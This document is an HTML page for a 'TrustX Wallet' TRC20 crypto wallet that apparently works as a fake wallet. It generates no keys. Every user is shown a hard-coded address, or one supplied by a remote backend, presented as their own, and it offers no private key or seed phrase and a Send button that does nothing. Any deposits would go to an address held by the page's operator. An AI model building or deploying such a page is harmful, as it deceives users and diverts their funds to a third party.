<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TrustX Wallet</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<style>
body{background:#0a0a0a;color:#fff;font-family:system-ui;margin:0;padding:16px}
.card{background:#1a1a1a;border-radius:20px;padding:20px;margin:12px 0;border:1px solid #333}
.btn{padding:14px 20px;border-radius:12px;border:none;font-weight:bold;cursor:pointer}
.btn-yellow{background:#facc15;color:#000;width:100%;font-size:16px}
.btn-white{background:#fff;color:#000}
.qr{background:#fff;padding:10px;display:inline-block;border-radius:10px;margin:10px 0}
.addr{word-break:break-all;background:#222;padding:12px;border-radius:10px;font-size:13px;color:#facc15}
.hidden{display:none}
</style>
</head>
<body>
<div style="display:flex;justify-content:space-between;margin-bottom:20px">
<div style="font-weight:bold;font-size:20px">🛡️ TrustX Wallet <small style="color:#888">TRC20</small></div>
<button style="padding:8px 16px;border-radius:20px;border:none" onclick="location.href='index.html'">Home</button>
</div>

<div id="createBox" class="card">
<h3>🛡️ Wallet Ready</h3>
<p id="status" style="color:#888">Your TRC20 wallet is active</p>
<button id="genBtn" class="card" style="width:100%;background:#facc15;color:#000;font-weight:bold" onclick="createWallet()">✨ Refresh Wallet</button>
</div>

<div class="card">
<div style="display:flex;justify-content:space-between"><span style="color:#888">TOTAL BALANCE</span><span style="background:#2a2a1a;color:#facc15;padding:4px 10px;border-radius:20px;font-size:12px">● TRC20</span></div>
<h1 id="bal" style="font-size:36px;margin:10px 0">$ 0.00</h1>
<p id="balSub" style="color:#888">Active</p>
<div style="display:flex;gap:10px;margin-top:15px">
<button class="btn btn-white" style="flex:1">📤 Send</button>
<button class="btn btn-yellow" style="flex:1">📥 Receive</button>
</div>
</div>

<div class="card" id="receiveBox">
<p style="text-align:center;color:#888;font-size:12px">YOUR TRC20 ADDRESS</p>
<div style="text-align:center"><div id="qrcode" class="qr"></div></div>
<div id="fullAddr" class="addr">TXt9gD1SL5c9JNVDesjdFWsJtXddEKU2V</div>
<div style="display:flex;gap:10px;margin-top:15px">
<button class="btn btn-white" style="flex:1" onclick="copyAddr()">Copy</button>
<button class="btn btn-yellow" style="flex:1" onclick="copyAddr()">Share</button>
</div>
</div>

<script>
const FIXED_ADDR = 'TXt9gD1SL5c9JNVDesjdFWsJtXddEKU2V';
let walletAddr = localStorage.getItem('trustx_wallet') || FIXED_ADDR;
function init(){
  document.getElementById('fullAddr').innerText = walletAddr;
  document.getElementById('balSub').innerText = walletAddr.slice(0,6)+'...'+walletAddr.slice(-6);
  document.getElementById('createBox').classList.add('hidden');
  try{ document.getElementById('qrcode').innerHTML=''; new QRCode(document.getElementById('qrcode'), {text: walletAddr, width:160, height:160}); }catch(e){}
  localStorage.setItem('trustx_wallet', walletAddr);
}
async function createWallet(){
  document.getElementById('status').innerText='Generating...';
  try{
    const res = await fetch('https://trustx-backend.vercel.app/');
    const data = await res.json();
    if(data && data.address) walletAddr = data.address;
    else walletAddr = FIXED_ADDR;
  }catch(e){ walletAddr = FIXED_ADDR; }
  localStorage.setItem('trustx_wallet', walletAddr);
  init();
}
function copyAddr(){ navigator.clipboard.writeText(walletAddr); alert('Copied: '+walletAddr); }
init();
</script>
</body>
</html>
